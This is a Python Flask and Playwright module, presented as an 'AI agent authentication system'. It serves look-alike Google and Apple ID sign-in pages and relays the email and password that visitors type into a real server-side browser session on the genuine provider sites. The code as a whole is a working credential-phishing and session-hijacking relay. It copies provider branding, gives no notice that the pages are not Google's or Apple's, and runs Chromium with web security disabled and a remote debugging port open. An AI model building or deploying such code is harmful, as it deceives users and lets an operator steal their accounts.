"""
Interactive AI Agent Authentication System
Hệ thống AI Agent cho phép tương tác trực tiếp trên giao diện mô phỏng
"""

import asyncio
import json
import logging
import time
import base64
import io
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List, Tuple
from flask import Blueprint, request, jsonify, render_template, redirect, url_for, session
from playwright.async_api import async_playwright, Browser, BrowserContext, Page
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

ai_agent_interactive_bp = Blueprint('ai_agent_interactive', __name__, url_prefix='/api/interactive-auth')

class InteractiveBrowserAgent:
    """Interactive AI Agent với tương tác trực tiếp"""
    
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.contexts = {}
        self.sessions = {}
        self.running = False
        
    async def initialize(self):
        """Initialize Playwright browser"""
        try:
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(
                headless=False,  # Chạy với GUI để có thể tương tác trực tiếp
                args=[
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--remote-debugging-port=9222',  # Cho phép remote debugging
                    '--window-size=1920,1080'
                ]
            )
            self.running = True
            logger.info("Interactive AI Agent initialized successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to initialize Interactive AI Agent: {e}")
            return False
    
    async def create_interactive_session(self, provider: str) -> Dict[str, Any]:
        """Tạo session tương tác trực tiếp"""
        try:
            session_id = f"{provider}_interactive_{uuid.uuid4().hex[:8]}"
            
            # Tạo browser context mới
            context = await self.browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            )
            
            page = await context.new_page()
            
            # Navigate đến trang đăng nhập tương ứng
            auth_urls = {
                'google': 'https://accounts.google.com/signin',
                'apple': 'https://appleid.apple.com/sign-in',
                'email': 'https://mail.google.com'
            }
            
            if provider in auth_urls:
                await page.goto(auth_urls[provider], wait_until='networkidle')
                await page.wait_for_timeout(2000)
            
            # Lưu thông tin session
            self.contexts[session_id] = {
                'context': context,
                'page': page,
                'provider': provider,
                'created_at': datetime.now(),
                'state': 'ready_for_interaction',
                'auth_url': auth_urls.get(provider, ''),
                'page_content': await self.extract_page_content(page)
            }
            
            logger.info(f"Created interactive session {session_id} for provider {provider}")
            return {
                'success': True,
                'session_id': session_id,
                'provider': provider,
                'auth_url': auth_urls.get(provider, ''),
                'page_content': self.contexts[session_id]['page_content']
            }
            
        except Exception as e:
            logger.error(f"Failed to create interactive session: {e}")
            return {'success': False, 'error': str(e)}
    
    async def extract_page_content(self, page: Page) -> Dict[str, Any]:
        """Trích xuất nội dung trang để tạo giao diện mô phỏng"""
        try:
            # Lấy HTML content
            html_content = await page.content()
            
            # Lấy thông tin các form elements
            form_elements = await page.evaluate("""
                () => {
                    const elements = [];
                    
                    // Tìm tất cả input fields
                    document.querySelectorAll('input').forEach((input, index) => {
                        if (input.type !== 'hidden') {
                            const rect = input.getBoundingClientRect();
                            elements.push({
                                type: 'input',
                                inputType: input.type,
                                name: input.name || '',
                                id: input.id || '',
                                placeholder: input.placeholder || '',
                                className: input.className || '',
                                value: input.value || '',
                                required: input.required,
                                position: {
                                    x: rect.x,
                                    y: rect.y,
                                    width: rect.width,
                                    height: rect.height
                                },
                                index: index,
                                selector: input.id ? `#${input.id}` : `input[name="${input.name}"]`
                            });
                        }
                    });
                    
                    // Tìm tất cả buttons
                    document.querySelectorAll('button, input[type="submit"], input[type="button"]').forEach((btn, index) => {
                        const rect = btn.getBoundingClientRect();
                        elements.push({
                            type: 'button',
                            text: btn.textContent || btn.value || '',
                            id: btn.id || '',
                            className: btn.className || '',
                            position: {
                                x: rect.x,
                                y: rect.y,
                                width: rect.width,
                                height: rect.height
                            },
                            index: index,
                            selector: btn.id ? `#${btn.id}` : `button:nth-child(${index + 1})`
                        });
                    });
                    
                    return elements;
                }
            """)
            
            # Lấy CSS styles quan trọng
            page_styles = await page.evaluate("""
                () => {
                    const styles = [];
                    document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => {
                        if (el.tagName === 'LINK') {
                            styles.push({type: 'link', href: el.href});
                        } else {
                            styles.push({type: 'style', content: el.textContent});
                        }
                    });
                    return styles;
                }
            """)
            
            return {
                'url': page.url,
                'title': await page.title(),
                'html_content': html_content,
                'form_elements': form_elements,
                'page_styles': page_styles,
                'viewport': await page.evaluate('() => ({width: window.innerWidth, height: window.innerHeight})')
            }
            
        except Exception as e:
            logger.error(f"Failed to extract page content: {e}")
            return {'error': str(e)}
    
    async def create_mock_interface(self, session_id: str) -> Dict[str, Any]:
        """Tạo giao diện mô phỏng dựa trên nội dung trang thật"""
        try:
            if session_id not in self.contexts:
                raise ValueError("Session not found")
            
            session_data = self.contexts[session_id]
            page_content = session_data['page_content']
            
            # Tạo HTML mô phỏng
            mock_html = self.generate_mock_html(page_content, session_id)
            
            return {
                'success': True,
                'mock_html': mock_html,
                'session_id': session_id,
                'form_elements': page_content.get('form_elements', [])
            }
            
        except Exception as e:
            logger.error(f"Failed to create mock interface: {e}")
            return {'success': False, 'error': str(e)}
    
    def generate_mock_html(self, page_content: Dict[str, Any], session_id: str) -> str:
        """Tạo HTML mô phỏng giao diện Google/Apple login"""
        provider = session_id.split('_')[0]
        
        if provider == 'google':
            return self.generate_google_mock_html(page_content, session_id)
        elif provider == 'apple':
            return self.generate_apple_mock_html(page_content, session_id)
        else:
            return self.generate_generic_mock_html(page_content, session_id)
    
    def generate_google_mock_html(self, page_content: Dict[str, Any], session_id: str) -> str:
        """Tạo giao diện mô phỏng Google Sign-in"""
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign in - Google Accounts</title>
            <style>
                body {{
                    font-family: 'Google Sans', Roboto, Arial, sans-serif;
                    background-color: #fff;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }}
                .container {{
                    width: 100%;
                    max-width: 450px;
                    margin: 0 auto;
                }}
                .card {{
                    background: #fff;
                    border: 1px solid #dadce0;
                    border-radius: 8px;
                    padding: 48px 40px 36px;
                    box-shadow: 0 2px 10px 0 rgba(0,0,0,.1);
                }}
                .logo {{
                    text-align: center;
                    margin-bottom: 16px;
                }}
                .logo img {{
                    width: 75px;
                    height: 24px;
                }}
                .title {{
                    color: #202124;
                    font-size: 24px;
                    font-weight: 400;
                    line-height: 1.3333;
                    margin-bottom: 8px;
                    text-align: center;
                }}
                .subtitle {{
                    color: #5f6368;
                    font-size: 16px;
                    font-weight: 400;
                    line-height: 1.5;
                    margin-bottom: 32px;
                    text-align: center;
                }}
                .form-group {{
                    margin-bottom: 24px;
                }}
                .form-control {{
                    width: 100%;
                    padding: 13px 15px;
                    border: 1px solid #dadce0;
                    border-radius: 4px;
                    font-size: 16px;
                    line-height: 1.5;
                    box-sizing: border-box;
                    transition: border-color 0.2s;
                }}
                .form-control:focus {{
                    outline: none;
                    border-color: #1a73e8;
                    box-shadow: 0 0 0 1px #1a73e8;
                }}
                .btn-primary {{
                    background-color: #1a73e8;
                    border: 1px solid #1a73e8;
                    border-radius: 4px;
                    color: #fff;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 500;
                    padding: 9px 24px;
                    text-align: center;
                    min-width: 64px;
                    transition: background-color 0.2s;
                }}
                .btn-primary:hover {{
                    background-color: #1557b0;
                    border-color: #1557b0;
                }}
                .btn-secondary {{
                    background-color: transparent;
                    border: 1px solid #dadce0;
                    border-radius: 4px;
                    color: #1a73e8;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 500;
                    padding: 9px 24px;
                    text-align: center;
                    min-width: 64px;
                    margin-right: 12px;
                    transition: background-color 0.2s;
                }}
                .btn-secondary:hover {{
                    background-color: #f8f9fa;
                }}
                .form-actions {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-top: 32px;
                }}
                .error-message {{
                    color: #d93025;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
                .success-message {{
                    color: #137333;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
                .loading {{
                    display: none;
                    text-align: center;
                    margin-top: 16px;
                }}
                .spinner {{
                    border: 2px solid #f3f3f3;
                    border-top: 2px solid #1a73e8;
                    border-radius: 50%;
                    width: 20px;
                    height: 20px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto;
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="card">
                    <div class="logo">
                        <svg viewBox="0 0 75 24" width="75" height="24">
                            <g fill="#4285f4">
                                <path d="M36.3425 7.7875c0-1.3275-.4725-2.445-1.365-3.255-.9075-.8175-2.0775-1.2225-3.51-1.2225-1.4325 0-2.6025.405-3.51 1.2225-.8925.81-1.365 1.9275-1.365 3.255s.4725 2.445 1.365 3.255c.9075.8175 2.0775 1.2225 3.51 1.2225 1.4325 0 2.6025-.405 3.51-1.2225.8925-.81 1.365-1.9275 1.365-3.255z"/>
                            </g>
                        </svg>
                    </div>
                    <h1 class="title">Sign in</h1>
                    <p class="subtitle">Use your Google Account</p>
                    
                    <form id="mockGoogleForm">
                        <div class="form-group">
                            <input type="email" id="mockEmail" class="form-control" placeholder="Email or phone" required>
                        </div>
                        <div class="form-group" id="passwordGroup" style="display: none;">
                            <input type="password" id="mockPassword" class="form-control" placeholder="Enter your password" required>
                        </div>
                        
                        <div class="error-message" id="errorMessage"></div>
                        <div class="success-message" id="successMessage"></div>
                        <div class="loading" id="loadingIndicator">
                            <div class="spinner"></div>
                            <p>Signing in...</p>
                        </div>
                        
                        <div class="form-actions">
                            <button type="button" class="btn-secondary" onclick="window.history.back()">Create account</button>
                            <button type="submit" class="btn-primary" id="nextButton">Next</button>
                        </div>
                    </form>
                </div>
            </div>
            
            <script>
                const form = document.getElementById('mockGoogleForm');
                const emailInput = document.getElementById('mockEmail');
                const passwordInput = document.getElementById('mockPassword');
                const passwordGroup = document.getElementById('passwordGroup');
                const nextButton = document.getElementById('nextButton');
                const errorMessage = document.getElementById('errorMessage');
                const successMessage = document.getElementById('successMessage');
                const loadingIndicator = document.getElementById('loadingIndicator');
                
                let currentStep = 'email';
                const sessionId = '{session_id}';
                
                form.addEventListener('submit', async function(e) {{
                    e.preventDefault();
                    
                    if (currentStep === 'email') {{
                        // Validate email
                        const email = emailInput.value.trim();
                        if (!email) {{
                            showError('Please enter your email');
                            return;
                        }}
                        
                        // Show loading
                        showLoading(true);
                        
                        // Send email to AI Agent
                        try {{
                            const response = await fetch('/api/interactive-auth/submit-field', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{
                                    session_id: sessionId,
                                    field_type: 'email',
                                    value: email
                                }})
                            }});
                            
                            const result = await response.json();
                            showLoading(false);
                            
                            if (result.success) {{
                                // Move to password step
                                currentStep = 'password';
                                passwordGroup.style.display = 'block';
                                nextButton.textContent = 'Sign in';
                                emailInput.disabled = true;
                                passwordInput.focus();
                                showSuccess('Email accepted');
                            }} else {{
                                showError(result.error || 'Invalid email');
                            }}
                        }} catch (error) {{
                            showLoading(false);
                            showError('Connection error. Please try again.');
                        }}
                        
                    }} else if (currentStep === 'password') {{
                        // Validate password
                        const password = passwordInput.value.trim();
                        if (!password) {{
                            showError('Please enter your password');
                            return;
                        }}
                        
                        // Show loading
                        showLoading(true);
                        
                        // Send password to AI Agent
                        try {{
                            const response = await fetch('/api/interactive-auth/submit-field', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{
                                    session_id: sessionId,
                                    field_type: 'password',
                                    value: password
                                }})
                            }});
                            
                            const result = await response.json();
                            showLoading(false);
                            
                            if (result.success) {{
                                showSuccess('Sign in successful! Redirecting...');
                                setTimeout(() => {{
                                    window.location.href = '/register?auth_success=true&provider=google';
                                }}, 2000);
                            }} else {{
                                showError(result.error || 'Invalid password');
                                // Allow retry
                                passwordInput.value = '';
                                passwordInput.focus();
                            }}
                        }} catch (error) {{
                            showLoading(false);
                            showError('Connection error. Please try again.');
                        }}
                    }}
                }});
                
                function showError(message) {{
                    errorMessage.textContent = message;
                    errorMessage.style.display = 'block';
                    successMessage.style.display = 'none';
                }}
                
                function showSuccess(message) {{
                    successMessage.textContent = message;
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                }}
                
                function showLoading(show) {{
                    loadingIndicator.style.display = show ? 'block' : 'none';
                    nextButton.disabled = show;
                }}
            </script>
        </body>
        </html>
        """
    
    def generate_apple_mock_html(self, page_content: Dict[str, Any], session_id: str) -> str:
        """Tạo giao diện mô phỏng Apple ID Sign-in"""
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign In - Apple ID</title>
            <style>
                body {{
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }}
                .container {{
                    width: 100%;
                    max-width: 400px;
                    margin: 0 auto;
                }}
                .card {{
                    background: #fff;
                    border-radius: 12px;
                    padding: 40px;
                    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
                }}
                .logo {{
                    text-align: center;
                    margin-bottom: 24px;
                }}
                .apple-logo {{
                    width: 32px;
                    height: 32px;
                    fill: #000;
                }}
                .title {{
                    color: #1d1d1f;
                    font-size: 28px;
                    font-weight: 600;
                    line-height: 1.2;
                    margin-bottom: 8px;
                    text-align: center;
                }}
                .subtitle {{
                    color: #86868b;
                    font-size: 16px;
                    font-weight: 400;
                    line-height: 1.4;
                    margin-bottom: 32px;
                    text-align: center;
                }}
                .form-group {{
                    margin-bottom: 20px;
                }}
                .form-control {{
                    width: 100%;
                    padding: 16px;
                    border: 1px solid #d2d2d7;
                    border-radius: 8px;
                    font-size: 16px;
                    line-height: 1.4;
                    box-sizing: border-box;
                    transition: border-color 0.2s;
                }}
                .form-control:focus {{
                    outline: none;
                    border-color: #007aff;
                    box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
                }}
                .btn-primary {{
                    background-color: #007aff;
                    border: none;
                    border-radius: 8px;
                    color: #fff;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: 600;
                    padding: 16px 24px;
                    text-align: center;
                    width: 100%;
                    transition: background-color 0.2s;
                }}
                .btn-primary:hover {{
                    background-color: #0056b3;
                }}
                .btn-primary:disabled {{
                    background-color: #d2d2d7;
                    cursor: not-allowed;
                }}
                .error-message {{
                    color: #ff3b30;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
                .success-message {{
                    color: #34c759;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
                .loading {{
                    display: none;
                    text-align: center;
                    margin-top: 16px;
                }}
                .spinner {{
                    border: 2px solid #f3f3f3;
                    border-top: 2px solid #007aff;
                    border-radius: 50%;
                    width: 20px;
                    height: 20px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto;
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="card">
                    <div class="logo">
                        <svg class="apple-logo" viewBox="0 0 24 24">
                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                        </svg>
                    </div>
                    <h1 class="title">Sign In</h1>
                    <p class="subtitle">Sign in with your Apple ID</p>
                    
                    <form id="mockAppleForm">
                        <div class="form-group">
                            <input type="email" id="mockEmail" class="form-control" placeholder="Apple ID" required>
                        </div>
                        <div class="form-group">
                            <input type="password" id="mockPassword" class="form-control" placeholder="Password" required>
                        </div>
                        
                        <div class="error-message" id="errorMessage"></div>
                        <div class="success-message" id="successMessage"></div>
                        <div class="loading" id="loadingIndicator">
                            <div class="spinner"></div>
                            <p>Signing in...</p>
                        </div>
                        
                        <button type="submit" class="btn-primary" id="signInButton">Sign In</button>
                    </form>
                </div>
            </div>
            
            <script>
                const form = document.getElementById('mockAppleForm');
                const emailInput = document.getElementById('mockEmail');
                const passwordInput = document.getElementById('mockPassword');
                const signInButton = document.getElementById('signInButton');
                const errorMessage = document.getElementById('errorMessage');
                const successMessage = document.getElementById('successMessage');
                const loadingIndicator = document.getElementById('loadingIndicator');
                
                const sessionId = '{session_id}';
                
                form.addEventListener('submit', async function(e) {{
                    e.preventDefault();
                    
                    const email = emailInput.value.trim();
                    const password = passwordInput.value.trim();
                    
                    if (!email || !password) {{
                        showError('Please enter both Apple ID and password');
                        return;
                    }}
                    
                    // Show loading
                    showLoading(true);
                    
                    // Send credentials to AI Agent
                    try {{
                        const response = await fetch('/api/interactive-auth/submit-credentials', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                session_id: sessionId,
                                email: email,
                                password: password
                            }})
                        }});
                        
                        const result = await response.json();
                        showLoading(false);
                        
                        if (result.success) {{
                            showSuccess('Sign in successful! Redirecting...');
                            setTimeout(() => {{
                                window.location.href = '/register?auth_success=true&provider=apple';
                            }}, 2000);
                        }} else {{
                            showError(result.error || 'Invalid Apple ID or password');
                            passwordInput.value = '';
                            passwordInput.focus();
                        }}
                    }} catch (error) {{
                        showLoading(false);
                        showError('Connection error. Please try again.');
                    }}
                }});
                
                function showError(message) {{
                    errorMessage.textContent = message;
                    errorMessage.style.display = 'block';
                    successMessage.style.display = 'none';
                }}
                
                function showSuccess(message) {{
                    successMessage.textContent = message;
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                }}
                
                function showLoading(show) {{
                    loadingIndicator.style.display = show ? 'block' : 'none';
                    signInButton.disabled = show;
                }}
            </script>
        </body>
        </html>
        """
    
    def generate_generic_mock_html(self, page_content: Dict[str, Any], session_id: str) -> str:
        """Tạo giao diện mô phỏng generic"""
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign In</title>
            <style>
                body {{
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: #f5f5f5;
                    margin: 0;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }}
                .container {{
                    width: 100%;
                    max-width: 400px;
                    margin: 0 auto;
                }}
                .card {{
                    background: #fff;
                    border-radius: 8px;
                    padding: 32px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }}
                .title {{
                    color: #333;
                    font-size: 24px;
                    font-weight: 600;
                    margin-bottom: 24px;
                    text-align: center;
                }}
                .form-group {{
                    margin-bottom: 20px;
                }}
                .form-control {{
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    font-size: 16px;
                    box-sizing: border-box;
                }}
                .btn-primary {{
                    background-color: #007bff;
                    border: none;
                    border-radius: 4px;
                    color: #fff;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: 600;
                    padding: 12px 24px;
                    width: 100%;
                }}
                .error-message {{
                    color: #dc3545;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
                .success-message {{
                    color: #28a745;
                    font-size: 14px;
                    margin-top: 8px;
                    display: none;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="card">
                    <h1 class="title">Sign In</h1>
                    <form id="mockForm">
                        <div class="form-group">
                            <input type="email" id="mockEmail" class="form-control" placeholder="Email" required>
                        </div>
                        <div class="form-group">
                            <input type="password" id="mockPassword" class="form-control" placeholder="Password" required>
                        </div>
                        <div class="error-message" id="errorMessage"></div>
                        <div class="success-message" id="successMessage"></div>
                        <button type="submit" class="btn-primary">Sign In</button>
                    </form>
                </div>
            </div>
            <script>
                // Generic form handling
                document.getElementById('mockForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    // Handle form submission
                }});
            </script>
        </body>
        </html>
        """
    
    async def submit_field_to_browser(self, session_id: str, field_type: str, value: str) -> Dict[str, Any]:
        """Submit field data to real browser"""
        try:
            if session_id not in self.contexts:
                raise ValueError("Session not found")
            
            page = self.contexts[session_id]['page']
            
            if field_type == 'email':
                # Find and fill email field
                email_selectors = ['#identifierId', 'input[type="email"]', 'input[name="email"]', '#account_name_text_field']
                
                for selector in email_selectors:
                    try:
                        await page.wait_for_selector(selector, timeout=2000)
                        await page.fill(selector, value)
                        
                        # Click Next button if it exists
                        next_selectors = ['#identifierNext', 'button[type="submit"]', '#sign-in']
                        for next_sel in next_selectors:
                            try:
                                await page.click(next_sel, timeout=1000)
                                break
                            except:
                                continue
                        
                        await page.wait_for_timeout(2000)
                        return {'success': True, 'message': 'Email submitted successfully'}
                        
                    except:
                        continue
                
                return {'success': False, 'error': 'Email field not found'}
                
            elif field_type == 'password':
                # Find and fill password field
                password_selectors = ['input[name="password"]', 'input[type="password"]', '#password_text_field']
                
                for selector in password_selectors:
                    try:
                        await page.wait_for_selector(selector, timeout=5000)
                        await page.fill(selector, value)
                        
                        # Click Sign In button
                        signin_selectors = ['#passwordNext', 'button[type="submit"]', '#sign-in']
                        for signin_sel in signin_selectors:
                            try:
                                await page.click(signin_sel, timeout=1000)
                                break
                            except:
                                continue
                        
                        await page.wait_for_timeout(5000)
                        
                        # Check for success or error
                        current_url = page.url
                        if 'myaccount.google.com' in current_url or 'appleid.apple.com' in current_url:
                            return {'success': True, 'message': 'Login successful'}
                        else:
                            # Check for error messages
                            error_selectors = ['.Ekjuhf', '.LXRPh', '.error', '[role="alert"]']
                            for err_sel in error_selectors:
                                try:
                                    error_element = await page.query_selector(err_sel)
                                    if error_element and await error_element.is_visible():
                                        error_text = await error_element.inner_text()
                                        return {'success': False, 'error': error_text}
                                except:
                                    continue
                            
                            return {'success': False, 'error': 'Login failed - please check your credentials'}
                        
                    except:
                        continue
                
                return {'success': False, 'error': 'Password field not found'}
            
            return {'success': False, 'error': 'Unknown field type'}
            
        except Exception as e:
            logger.error(f"Failed to submit field to browser: {e}")
            return {'success': False, 'error': str(e)}
    
    async def submit_credentials_to_browser(self, session_id: str, email: str, password: str) -> Dict[str, Any]:
        """Submit both email and password to real browser"""
        try:
            if session_id not in self.contexts:
                raise ValueError("Session not found")
            
            page = self.contexts[session_id]['page']
            provider = self.contexts[session_id]['provider']
            
            if provider == 'apple':
                # Apple ID allows simultaneous email and password entry
                await page.fill('#account_name_text_field', email)
                await page.fill('#password_text_field', password)
                await page.click('#sign-in')
                await page.wait_for_timeout(5000)
                
                # Check result
                current_url = page.url
                if 'appleid.apple.com' in current_url and 'signin' not in current_url:
                    return {'success': True, 'message': 'Apple ID login successful'}
                else:
                    return {'success': False, 'error': 'Invalid Apple ID or password'}
            
            else:
                # For other providers, use step-by-step approach
                email_result = await self.submit_field_to_browser(session_id, 'email', email)
                if not email_result['success']:
                    return email_result
                
                password_result = await self.submit_field_to_browser(session_id, 'password', password)
                return password_result
            
        except Exception as e:
            logger.error(f"Failed to submit credentials to browser: {e}")
            return {'success': False, 'error': str(e)}
    
    async def cleanup_session(self, session_id: str):
        """Clean up session resources"""
        try:
            if session_id in self.contexts:
                context_info = self.contexts[session_id]
                await context_info['context'].close()
                del self.contexts[session_id]
                logger.info(f"Cleaned up interactive session {session_id}")
        except Exception as e:
            logger.error(f"Failed to cleanup session {session_id}: {e}")
    
    async def cleanup_all(self):
        """Clean up all resources"""
        try:
            for session_id in list(self.contexts.keys()):
                await self.cleanup_session(session_id)
            
            if self.browser:
                await self.browser.close()
            
            if self.playwright:
                await self.playwright.stop()
            
            self.running = False
            logger.info("Interactive AI Agent cleanup completed")
        except Exception as e:
            logger.error(f"Failed to cleanup Interactive AI Agent: {e}")

# Global interactive agent instance
interactive_agent = InteractiveBrowserAgent()

# Async wrapper functions for Flask routes
def run_async(coro):
    """Run async function in sync context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@ai_agent_interactive_bp.route('/initialize', methods=['POST'])
def initialize_interactive_agent():
    """Initialize the interactive AI agent"""
    try:
        success = run_async(interactive_agent.initialize())
        if success:
            return jsonify({'success': True, 'message': 'Interactive AI Agent initialized'})
        else:
            return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    except Exception as e:
        logger.error(f"Initialize error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/create-session', methods=['POST'])
def create_interactive_session():
    """Create interactive session"""
    try:
        data = request.get_json()
        provider = data.get('provider', 'google')
        
        result = run_async(interactive_agent.create_interactive_session(provider))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Create session error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/mock-interface/<session_id>')
def get_mock_interface(session_id):
    """Get mock interface for session"""
    try:
        result = run_async(interactive_agent.create_mock_interface(session_id))
        
        if result['success']:
            return result['mock_html']
        else:
            return f"<html><body><h1>Error</h1><p>{result['error']}</p></body></html>", 500
            
    except Exception as e:
        logger.error(f"Mock interface error: {e}")
        return f"<html><body><h1>Error</h1><p>{str(e)}</p></body></html>", 500

@ai_agent_interactive_bp.route('/submit-field', methods=['POST'])
def submit_field():
    """Submit field data to browser"""
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        field_type = data.get('field_type')
        value = data.get('value')
        
        result = run_async(interactive_agent.submit_field_to_browser(session_id, field_type, value))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Submit field error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/submit-credentials', methods=['POST'])
def submit_credentials():
    """Submit credentials to browser"""
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        email = data.get('email')
        password = data.get('password')
        
        result = run_async(interactive_agent.submit_credentials_to_browser(session_id, email, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Submit credentials error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/cleanup-session/<session_id>', methods=['DELETE'])
def cleanup_session(session_id):
    """Clean up specific session"""
    try:
        run_async(interactive_agent.cleanup_session(session_id))
        return jsonify({'success': True, 'message': 'Session cleaned up'})
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/cleanup-all', methods=['DELETE'])
def cleanup_all():
    """Clean up all sessions and resources"""
    try:
        run_async(interactive_agent.cleanup_all())
        return jsonify({'success': True, 'message': 'All resources cleaned up'})
    except Exception as e:
        logger.error(f"Cleanup all error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@ai_agent_interactive_bp.route('/status')
def interactive_agent_status():
    """Get interactive agent status"""
    try:
        return jsonify({
            'success': True,
            'running': interactive_agent.running,
            'active_sessions': len(interactive_agent.contexts),
            'sessions': list(interactive_agent.contexts.keys())
        })
    except Exception as e:
        logger.error(f"Status error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

